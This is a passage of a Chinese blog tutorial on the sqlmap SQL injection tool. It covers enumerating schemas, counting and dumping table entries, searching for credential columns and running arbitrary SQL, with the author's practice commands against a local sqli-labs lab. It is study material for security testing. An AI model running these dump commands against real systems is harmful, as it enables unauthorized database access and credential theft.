+<p>针对 MySQL 目标的示例：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">$ python sqlmap.py <span class="operator">-</span>u &quot;http://192.168.48.130/sqlmap/mysql/get_int.php?id=1&quot; <span class="comment">--s\chema--batch --exclude-sysdbs</span></span><br><span class="line"></span><br><span class="line">[...]</span><br><span class="line"></span><br><span class="line">Database: owasp10</span><br><span class="line"><span class="keyword">Table</span>: accounts</span><br><span class="line">[<span class="number">4</span> columns]</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+---------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">Column</span>      <span class="operator">|</span> Type    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+---------+</span></span><br><span class="line"><span class="operator">|</span> cid         <span class="operator">|</span> <span class="type">int</span>(<span class="number">11</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> mysignature <span class="operator">|</span> text    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> password    <span class="operator">|</span> text    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> username    <span class="operator">|</span> text    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+---------+</span></span><br><span class="line"></span><br><span class="line">Database: owasp10</span><br><span class="line"><span class="keyword">Table</span>: blogs_table</span><br><span class="line">[<span class="number">4</span> columns]</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------+----------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">Column</span>       <span class="operator">|</span> Type     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------+----------+</span></span><br><span class="line"><span class="operator">|</span> <span class="type">date</span>         <span class="operator">|</span> datetime <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> blogger_name <span class="operator">|</span> text     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> cid          <span class="operator">|</span> <span class="type">int</span>(<span class="number">11</span>)  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> comment      <span class="operator">|</span> text     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------+----------+</span></span><br><span class="line"></span><br><span class="line">Database: owasp10</span><br><span class="line"><span class="keyword">Table</span>: hitlog</span><br><span class="line">[<span class="number">6</span> columns]</span><br><span class="line"><span class="operator">+</span><span class="comment">----------+----------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">Column</span>   <span class="operator">|</span> Type     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+----------+</span></span><br><span class="line"><span class="operator">|</span> <span class="type">date</span>     <span class="operator">|</span> datetime <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> browser  <span class="operator">|</span> text     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> cid      <span class="operator">|</span> <span class="type">int</span>(<span class="number">11</span>)  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> hostname <span class="operator">|</span> text     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ip       <span class="operator">|</span> text     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> referer  <span class="operator">|</span> text     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+----------+</span></span><br><span class="line"></span><br><span class="line">Database: testdb</span><br><span class="line"><span class="keyword">Table</span>: users</span><br><span class="line">[<span class="number">3</span> columns]</span><br><span class="line"><span class="operator">+</span><span class="comment">---------+---------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">Column</span>  <span class="operator">|</span> Type          <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------+---------------+</span></span><br><span class="line"><span class="operator">|</span> id      <span class="operator">|</span> <span class="type">int</span>(<span class="number">11</span>)       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> name    <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">500</span>)  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> surname <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">1000</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------+---------------+</span></span><br><span class="line"></span><br><span class="line">[...]</span><br></pre></td></tr></table></figure>
+</blockquote>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\sqlmap<span class="operator">&gt;</span>python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">-</span>labs:<span class="number">8080</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--schema --batch --exclude-sysdbs</span></span><br></pre></td></tr></table></figure>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/img/image-20210502215229748.png"
+                      alt="image-20210502215229748"
+                ></p>
+<h3 id="获取数据表的数据条目数"><a href="#获取数据表的数据条目数" class="headerlink" title="获取数据表的数据条目数"></a>获取数据表的数据条目数</h3><blockquote>
+<p>开关：<code>--count</code></p>
+<p>如果用户想要在导出所需表数据之前知道表中的条目数，可以使用此开关。</p>
+<p>针对 Microsoft SQL Server 目标的示例：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ python sqlmap.py <span class="operator">-</span>u &quot;http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1&quot;\</span><br><span class="line"> <span class="comment">--count -D testdb</span></span><br><span class="line">[...]</span><br><span class="line">Database: testdb</span><br><span class="line"><span class="operator">+</span><span class="comment">----------------+---------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">Table</span>          <span class="operator">|</span> Entries <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------------+---------+</span></span><br><span class="line"><span class="operator">|</span> dbo.users      <span class="operator">|</span> <span class="number">4</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> dbo.users_blob <span class="operator">|</span> <span class="number">2</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------------+---------+</span></span><br></pre></td></tr></table></figure>
+</blockquote>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\sqlmap<span class="operator">&gt;</span>python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">-</span>labs:<span class="number">8080</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--count -D security</span></span><br></pre></td></tr></table></figure>
+
+<p>这里指定了数据库为”security”</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/img/image-20210502215533633.png"
+                      alt="image-20210502215533633"
+                ></p>
+<h3 id="导出数据表条目"><a href="#导出数据表条目" class="headerlink" title="导出数据表条目"></a>导出数据表条目</h3><blockquote>
+<p>开关和选项：<code>--dump</code>，<code>-C</code>，<code>-T</code>，<code>-D</code>，<code>--start</code>，<code>--stop</code>，<code>--first</code>，<code>--last</code>，<code>--pivot-column</code> 和 <code>--where</code></p>
+<p>如果当前会话用户对特定的数据表有读取权限，则可以导出数据表条目。</p>
+<p>此功能依赖选项 <code>-T</code> 来指定表名，还可以用选项 <code>-D</code> 来指定数据库名称。如果提供了表名而不提供数据库名，则会使用当前的数据库。</p>
+<p>针对 Firebird 目标的示例：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ python sqlmap.py <span class="operator">-</span>u &quot;http://192.168.136.131/sqlmap/firebird/get_int.php?id=1&quot;\</span><br><span class="line"> <span class="comment">--dump -T users</span></span><br><span class="line">[...]</span><br><span class="line">Database: Firebird_masterdb</span><br><span class="line"><span class="keyword">Table</span>: USERS</span><br><span class="line">[<span class="number">4</span> entries]</span><br><span class="line"><span class="operator">+</span><span class="comment">----+--------+------------+</span></span><br><span class="line"><span class="operator">|</span> ID <span class="operator">|</span> NAME   <span class="operator">|</span> SURNAME    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+--------+------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span>  <span class="operator">|</span> luther <span class="operator">|</span> blisset    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">2</span>  <span class="operator">|</span> fluffy <span class="operator">|</span> bunny      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">3</span>  <span class="operator">|</span> wu     <span class="operator">|</span> ming       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">4</span>  <span class="operator">|</span> <span class="keyword">NULL</span>   <span class="operator">|</span> nameisnull <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+--------+------------+</span></span><br></pre></td></tr></table></figure>
+
+<p>此开关也可用于导出指定数据库数据表的所有条目。你只需要提供开关 <code>--dump</code> 和选项 <code>-D</code>（不提供 <code>-T</code> 和 <code>-C</code>）。</p>
+<p>你还可以使用选项 <code>-C</code> 提供一个以逗号分隔的特定列名列表来导出数据。</p>
+<p>sqlmap 还能会为每个表生成相应的 CSV 格式文本文件用于存储导出的数据。你可以通过提供大于或等于 <strong>1</strong> 的详细程度级别来查看 sqlmap 所创建文件的绝对路径。</p>
+<p>如果只是想导出特定范围的条目，可以提供选项 <code>--start</code> 和/或 <code>--stop</code>，以指定要从哪条数据开始导出和在哪条数据停止。例如，如果仅导出第一个条目，就在命令行中提供 <code>--stop 1</code>。或者如果你只想导出第二和第三个条目，就提供 <code>--start 1</code> <code>--stop 3</code>。</p>
+<p>还可以使用选项 <code>--first</code> 和 <code>--last</code> 指定要导出的单个字符或特定范围的字符。例如，如果要导出条目的第三到第五个字符，就提供 <code>--first 3</code> <code>--last 5</code>。此功能仅适用于盲注技术，因为报错型注入（Error-based）和联合查询注入（UNION query-based）技术不管列数据条目的长度如何，发起的请求数量是完全相同的。</p>
+<p>有些情况下（例如：对于 Microsoft SQL Server，Sybase 和 SAP MaxDB），由于缺少类似的机制，无法使用 <code>OFFSET m, n</code> 直接导出表的数据。在这种情况下，sqlmap 通过确定最适合的 <code>pivot</code> 列（具有唯一值的列，一般是主键），并使用该列检索其他列值，以此来导出数据。如果因为自动选择的 <code>pivot</code> 列不适用（例如：由于缺少表导出结果）而需要强制使用特定列，你可以使用选项 <code>--pivot-column</code>（例如： <code>--pivot-column=id</code>）。</p>
+<p>如果要约束导出特定的列值（或范围），可以使用选项 <code>--where</code>。提供的逻辑运算将自动在 <code>WHERE</code> 子句内使用。例如，如果使用 <code>--where=&quot;id&gt;3&quot;</code>，那么只有 <code>id</code> 值大于 3 的行会被获取（通过将 <code>WHERE id&gt;3</code> 附加到使用的查询语句中）。</p>
+<p>正如你可能已经注意到的，sqlmap 非常<strong>灵活</strong>：你可以将让其自动导出整个数据库表，或者非常精确地导出特定字符、列和范围的条目。</p>
+</blockquote>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\sqlmap<span class="operator">&gt;</span>python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">-</span>labs:<span class="number">8080</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="operator">-</span>D security <span class="operator">-</span>T users <span class="operator">-</span>C password,username <span class="comment">--dump</span></span><br></pre></td></tr></table></figure>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/img/image-20210502220016913.png"
+                      alt="image-20210502220016913"
+                ></p>
+<p><code>--dump</code>导出了数据库该数据表下所有条目</p>
+<p><code>--start</code>或<code>--stop</code>用于控制输出的条目</p>
+<p>​    <code>--stop 1</code>仅导出第一个条目</p>
+<p>​    <code>--start 1 --stop 3</code>仅导出第二、第三个条目</p>
+<p><code>--first 3 --last 5</code>导出条目的第三到第五个字符</p>
+<h3 id="导出所有数据表条目"><a href="#导出所有数据表条目" class="headerlink" title="导出所有数据表条目"></a>导出所有数据表条目</h3><blockquote>
+<p>开关：<code>--dump-all</code> 和 <code>--exclude-sysdbs</code></p>
+<p>如果当前会话用户的读取权限允许，可以一次导出所有数据库表条目。</p>
+<p>你还可以提供开关 <code>--exclude-sysdbs</code> 以排除所有的系统数据库。在这种情况下，sqlmap 只会导出当前用户的数据库表条目。</p>
+<p>注意，对于 Microsoft SQL Server，<code>master</code> 数据库不被视为系统数据库，因为某些数据库管理员将其用作用户数据库。</p>
+</blockquote>
+<h3 id="搜索列，表或数据库"><a href="#搜索列，表或数据库" class="headerlink" title="搜索列，表或数据库"></a>搜索列，表或数据库</h3><blockquote>
+<p>开关和选项：<code>--search</code>，<code>-C</code>，<code>-T</code>，<code>-D</code></p>
+<p>此开关允许你<strong>在所有数据库中搜索特定的数据库名和表名，在特定的数据表中搜索特定的列名</strong>。</p>
+<p>这非常有用，例如，要识别包含应用程序凭据的表，其中相关列的名称包含诸如 <em>name</em> 和 <em>pass</em> 这样的字符串。</p>
+<p>开关 <code>--search</code> 需要与以下支持选项一起使用：</p>
+<ul>
+<li><code>-C</code>，附带以逗号分隔的列名列表来搜索整个 DBMS。</li>
+<li><code>-T</code>，附带以逗号分隔的表名列表来搜索整个 DBMS。</li>
+<li><code>-D</code>，附带以逗号分隔的数据库名列表来搜索整个 DBMS。</li>
+</ul>
+</blockquote>
+<h3 id="运行自定义-SQL-语句"><a href="#运行自定义-SQL-语句" class="headerlink" title="运行自定义 SQL 语句"></a>运行自定义 SQL 语句</h3><blockquote>
+<p>选项和开关：<code>--sql-query</code> 和 <code>--sql-shell</code></p>
+<p>SQL 查询和 SQL shell 功能允许在 DBMS 上运行任意 SQL 语句。sqlmap 会自动解析提供的语句，确定哪种技术适合用于注入它，以及如何打包相应的 SQL payload。</p>
+<p>如果查询是 <code>SELECT</code> 语句，sqlmap 将获取其输出。否则，如果 Web 应用程序的后端 DBMS 支持多语句，它将通过堆叠查询注入（Stacked queries）技术执行查询。注意，某些 Web 应用程序技术不支持特定 DBMS 上的堆叠查询。例如，当后端 DBMS 是 MySQL 时，PHP 不支持堆叠查询，但是当后端 DBMS 是 PostgreSQL 时，它是支持的。</p>
+<p>针对 Microsoft SQL Server 2000 目标的示例：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">$ python sqlmap.py <span class="operator">-</span>u &quot;http://192.168.136.131/sqlmap/mssql/get_int.php?id=1&quot; <span class="comment">--\</span></span><br><span class="line"><span class="keyword">sql</span><span class="operator">-</span>query &quot;SELECT &#x27;foo&#x27;&quot; <span class="operator">-</span>v <span class="number">1</span></span><br><span class="line"></span><br><span class="line">[...]</span><br><span class="line">[hh:mm:<span class="number">14</span>] [INFO] fetching <span class="keyword">SQL</span> <span class="keyword">SELECT</span> query output: <span class="string">&#x27;SELECT &#x27;</span>foo<span class="string">&#x27;&#x27;</span></span><br><span class="line">[hh:mm:<span class="number">14</span>] [INFO] retrieved: foo</span><br><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;foo&#x27;</span>:    <span class="string">&#x27;foo&#x27;</span></span><br><span class="line"></span><br><span class="line">$ python sqlmap.py <span class="operator">-</span>u &quot;http://192.168.136.131/sqlmap/mssql/get_int.php?id=1&quot; <span class="comment">--\</span></span><br><span class="line"><span class="keyword">sql</span><span class="operator">-</span>query &quot;SELECT &#x27;foo&#x27;，&#x27;bar&#x27;&quot; <span class="operator">-</span>v <span class="number">2</span></span><br><span class="line"></span><br><span class="line">[...]</span><br><span class="line">[hh:mm:<span class="number">50</span>] [INFO] fetching <span class="keyword">SQL</span> <span class="keyword">SELECT</span> query output: <span class="string">&#x27;SELECT &#x27;</span>foo<span class="string">&#x27;, &#x27;</span>bar<span class="string">&#x27;&#x27;</span></span><br><span class="line">[hh:mm:<span class="number">50</span>] [INFO] the <span class="keyword">SQL</span> query provided has more than a field. sqlmap will now</span><br><span class="line">unpack it <span class="keyword">into</span> <span class="keyword">distinct</span> queries <span class="keyword">to</span> be able <span class="keyword">to</span> retrieve the output even if we <span class="keyword">are</span></span><br><span class="line"> going blind</span><br><span class="line">[hh:mm:<span class="number">50</span>] [DEBUG] query: <span class="keyword">SELECT</span> ISNULL(<span class="built_in">CAST</span>((<span class="type">CHAR</span>(<span class="number">102</span>)<span class="operator">+</span><span class="type">CHAR</span>(<span class="number">111</span>)<span class="operator">+</span><span class="type">CHAR</span>(<span class="number">111</span>)) <span class="keyword">AS</span></span><br><span class="line"><span class="type">VARCHAR</span>(<span class="number">8000</span>)), (<span class="type">CHAR</span>(<span class="number">32</span>)))</span><br><span class="line">[hh:mm:<span class="number">50</span>] [INFO] retrieved: foo</span><br><span class="line">[hh:mm:<span class="number">50</span>] [DEBUG] performed <span class="number">27</span> queries <span class="keyword">in</span> <span class="number">0</span> seconds</span><br><span class="line">[hh:mm:<span class="number">50</span>] [DEBUG] query: <span class="keyword">SELECT</span> ISNULL(<span class="built_in">CAST</span>((<span class="type">CHAR</span>(<span class="number">98</span>)<span class="operator">+</span><span class="type">CHAR</span>(<span class="number">97</span>)<span class="operator">+</span><span class="type">CHAR</span>(<span class="number">114</span>)) <span class="keyword">AS</span> VA</span><br><span class="line">RCHAR(<span class="number">8000</span>)), (<span class="type">CHAR</span>(<span class="number">32</span>)))</span><br><span class="line">[hh:mm:<span class="number">50</span>] [INFO] retrieved: bar</span><br><span class="line">[hh:mm:<span class="number">50</span>] [DEBUG] performed <span class="number">27</span> queries <span class="keyword">in</span> <span class="number">0</span> seconds</span><br><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;foo&#x27;</span>, <span class="string">&#x27;bar&#x27;</span>:    <span class="string">&#x27;foo, bar&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>如你所见，sqlmap 将提供的查询分解为两个不同的 <code>SELECT</code> 语句，然后单独获取每个查询的输出。</p>
+<p>如果提供的查询是一个 <code>SELECT</code> 语句并包含一个 <code>FROM</code> 子句，sqlmap 会询问你是否可以返回多个条目。在这种情况下，它知道如何解析返回的结果，逐条计算指定的条目数量，并给出相关输出。</p>
+<p>SQL shell 选项允许你以交互方式运行自己的 SQL 语句，就像直接连接到 DBMS 的 SQL 控制台。此功能还提供 TAB 补全和输入历史支持。</p>
+</blockquote>
+<h2 id="个人剧场"><a href="#个人剧场" class="headerlink" title="个人剧场"></a>个人剧场</h2><p>基本上，使用完整的单词作为命令的，使用<code>--</code></p>
+<p>使用单个单词大写字母的，使用<code>-</code></p>
+<p><code>--dbs</code>用于搜索数据库，<code>-D</code>则用于指定数据库</p>
+<p><code>--tables</code>用于搜索数据表，<code>-T</code>则用于指定数据表</p>
+<p><code>--columns</code>用于搜索字段，<code>-C</code>则用于指定字段</p>
+
+        </div>
+
+        
+
+        
+            <div class="article-nav">
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2021/%E8%AE%B0%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%8EPHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">记一个简单的文件包含漏洞与PHP伪协议</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2020</span>&nbsp;-&nbsp;
+            
+            2021&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">BEACON</a>
+        </div>
+        
+            <script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv">
+                        Visitor Count&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv">
+                        Totalview&nbsp;<span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.1</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    
+        <aside class="page-aside">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL-sqlmap%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="nav-number">1.</span> <span class="nav-text">SQL-sqlmap的使用</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%94%A8%E6%B3%95"><span class="nav-number">2.</span> <span class="nav-text">用法</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9E%9A%E4%B8%BE"><span class="nav-number">2.1.</span> <span class="nav-text">枚举</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E5%85%A8%E9%83%A8%E6%95%B0%E6%8D%AE"><span class="nav-number">2.1.1.</span> <span class="nav-text">获取全部数据</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A0%87%E8%AF%AD%EF%BC%88Banner%EF%BC%89"><span class="nav-number">2.1.2.</span> <span class="nav-text">标语（Banner）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BD%93%E5%89%8D%E4%BC%9A%E8%AF%9D%E7%94%A8%E6%88%B7"><span class="nav-number">2.1.3.</span> <span class="nav-text">当前会话用户</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BD%93%E5%89%8D%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="nav-number">2.1.4.</span> <span class="nav-text">当前数据库</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%BB%E6%9C%BA%E5%90%8D"><span class="nav-number">2.1.5.</span> <span class="nav-text">服务器主机名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A3%80%E6%B5%8B%E5%BD%93%E5%89%8D%E4%BC%9A%E8%AF%9D%E7%94%A8%E6%88%B7%E6%98%AF%E5%90%A6%E4%B8%BA%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AE%A1%E7%90%86%E5%91%98"><span class="nav-number">2.1.6.</span> <span class="nav-text">检测当前会话用户是否为数据库管理员</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%97%E5%87%BA-DBMS-%E6%89%80%E6%9C%89%E7%94%A8%E6%88%B7"><span class="nav-number">2.1.7.</span> <span class="nav-text">列出 DBMS 所有用户</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%97%E5%87%BA%E5%92%8C%E7%A0%B4%E8%A7%A3-DBMS-%E7%94%A8%E6%88%B7%E7%9A%84%E5%AF%86%E7%A0%81%E5%93%88%E5%B8%8C"><span class="nav-number">2.1.8.</span> <span class="nav-text">列出和破解 DBMS 用户的密码哈希</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%97%E5%87%BA-DBMS-%E6%89%80%E6%9C%89%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90"><span class="nav-number">2.1.9.</span> <span class="nav-text">列出 DBMS 所有用户权限</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%97%E5%87%BA-DBMS-%E6%89%80%E6%9C%89%E7%94%A8%E6%88%B7%E8%A7%92%E8%89%B2"><span class="nav-number">2.1.10.</span> <span class="nav-text">列出 DBMS 所有用户角色</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%97%E5%87%BA-DBMS-%E6%89%80%E6%9C%89%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="nav-number">2.1.11.</span> <span class="nav-text">列出 DBMS 所有数据库</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9E%9A%E4%B8%BE%E6%95%B0%E6%8D%AE%E8%A1%A8"><span class="nav-number">2.1.12.</span> <span class="nav-text">枚举数据表</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9E%9A%E4%B8%BE%E6%95%B0%E6%8D%AE%E8%A1%A8%E7%9A%84%E5%88%97%E5%90%8D"><span class="nav-number">2.1.13.</span> <span class="nav-text">枚举数据表的列名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9E%9A%E4%B8%BE-DBMS-%E6%A8%A1%E5%BC%8F"><span class="nav-number">2.1.14.</span> <span class="nav-text">枚举 DBMS 模式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E8%A1%A8%E7%9A%84%E6%95%B0%E6%8D%AE%E6%9D%A1%E7%9B%AE%E6%95%B0"><span class="nav-number">2.1.15.</span> <span class="nav-text">获取数据表的数据条目数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AF%BC%E5%87%BA%E6%95%B0%E6%8D%AE%E8%A1%A8%E6%9D%A1%E7%9B%AE"><span class="nav-number">2.1.16.</span> <span class="nav-text">导出数据表条目</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AF%BC%E5%87%BA%E6%89%80%E6%9C%89%E6%95%B0%E6%8D%AE%E8%A1%A8%E6%9D%A1%E7%9B%AE"><span class="nav-number">2.1.17.</span> <span class="nav-text">导出所有数据表条目</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" 